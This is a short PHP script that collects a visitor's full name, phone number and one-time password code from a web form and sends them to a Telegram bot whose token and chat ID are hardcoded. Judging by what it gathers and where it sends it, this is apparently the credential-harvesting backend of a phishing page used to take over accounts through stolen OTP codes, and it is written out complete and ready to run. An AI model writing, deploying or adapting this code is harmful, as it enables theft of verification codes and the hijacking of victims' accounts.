<?php
// Replace with your bot token and chat ID
$botToken = "7198347062:AAEHa7mANc9-4o-OKwa653BKYVbgXW_0NUk";
$chatId = "5876510981";

// Get the POST data
$full_name = isset($_POST['full_name']) ? $_POST['full_name'] : '';
$phone_number = isset($_POST['phone_number']) ? $_POST['phone_number'] : '';
$otp_code = isset($_POST['otp_code']) ? $_POST['otp_code'] : '';

// Prepare message
$message = "Full Name: $full_name\n";
$message .= "Phone Number: $phone_number\n";
if ($otp_code) {
    $message .= "OTP Code: $otp_code\n";
}

// Send data to Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
$response = file_get_contents($url);

// Return the response to confirm the message was sent
echo $response;
?>
